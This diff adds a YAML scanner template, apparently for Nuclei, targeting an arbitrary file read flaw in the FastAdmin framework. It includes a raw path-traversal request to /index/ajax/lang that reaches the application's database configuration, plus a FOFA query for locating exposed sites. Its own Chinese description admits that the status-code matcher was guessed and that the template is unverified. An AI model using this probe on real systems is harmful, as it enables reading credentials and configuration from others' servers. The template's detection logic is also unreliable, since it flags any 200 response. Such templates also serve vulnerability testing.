@@ -1,0 +1,21 @@
+id: poc-ofqlxvvw6748b15o
+info:
+  name: Fastadmin框架lang任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ofqlxvvw6748b15o
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ofqlxvvw6748b15o
+    fofa: app="FASTADMIN-框架"
+http:
+- raw:
+  - GET /index/ajax/lang?lang=../../application/database HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
